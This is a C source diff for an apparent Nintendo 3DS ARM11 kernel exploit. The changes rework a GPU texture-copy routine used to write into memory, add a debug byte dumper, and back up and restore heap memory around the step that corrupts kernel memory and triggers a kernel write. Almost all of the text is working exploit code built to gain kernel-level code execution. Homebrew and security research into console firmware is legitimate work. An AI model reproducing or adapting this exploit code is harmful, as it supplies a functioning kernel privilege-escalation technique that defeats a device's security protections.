@@ -17,23 +17,32 @@ unsigned int *arm11_buffer;
 //Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
 
-int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val, int check_off)
+int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
-	unsigned int result;
 	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
+	int i = 0;
 
-	do
-	{
+	// Sometimes I don't know the actual value to check (when copying from unknown memory)
+	// so instead of using check_mem/check_off, just loop "enough" times.
+	for (i = 0; i < 5; ++i) {
 		GSPGPU_FlushDataCache (NULL, src, len);
 		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
 		GSPGPU_FlushDataCache (NULL, check_mem, 16);
 		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
-		result = *(unsigned int *)(check_mem + check_off);
-	} while (result != check_val);
+	}
 
 	linearFree(check_mem);
 
 	return 0;
+}
+
+void dump_bytes(void *dst) {
+	printf("DUMPING %p\n", dst);
+	do_gshax_copy(arm11_buffer, dst, 0x20u);
+
+	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
+			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
+			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
 }
 
 int arm11_kernel_exploit_setup(void)
@@ -111,10 +120,20 @@ int arm11_kernel_exploit_setup(void)
 #endif
 
 	// part 1: corrupt kernel memory
-	// 0xFFFFFE0 is just stack memory for scratch space
-	unsigned int mem_hax_mem = linearMemAlign(0x10000, 0x2000);
+	u32 tmp_addr;
+
+	unsigned int mem_hax_mem;
+	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
 	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;
-	svcControlMemory(0xFFFFFE0, mem_hax_mem_free, 0, 0x1000, 1, 0); // free page 
+
+	printf("Freeing memory\n");
+	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 
+
+	printf("Backing up heap area\n");
+	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
+
+	u32 saved_heap[8];
+	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));
 
 	arm11_buffer[0] = 1;
 	arm11_buffer[1] = patch_addr;
@@ -127,15 +146,18 @@ int arm11_kernel_exploit_setup(void)
 #endif
 
 	//Trigger write to kernel
-	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u, patch_addr, 4);
-	svcControlMemory(0xFFFFFE0, mem_hax_mem, 0, 0x1000, 1, 0);
-	//linearFree(mem_hax_mem);
+	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
+	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
 
 #ifdef DEBUG_PROCESS
 	printf("Triggered kernel write\n");
 	gfxFlushBuffers();
 	gfxSwapBuffers();
 #endif
+
+	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
+	printf("Restoring heap\n");
+	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
 
 	 // part 2: trick to clear icache
 	for (i = 0; i < 0x1000; i++)
@@ -145,7 +167,7 @@ int arm11_kernel_exploit_setup(void)
 	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
 	nop_func = nop_slide;
 
-	do_gshax_copy(nop_slide, arm11_buffer, 0x10000, 0xE1A00000, 0);
+	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);
 
 	HB_FlushInvalidateCache();
 	nop_func();
@@ -248,7 +270,6 @@ int doARM11Hax()
 
 	if(arm11_kernel_exploit_setup())
 	{
-
 #ifdef DEBUG_PROCESS
 		printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
 #endif
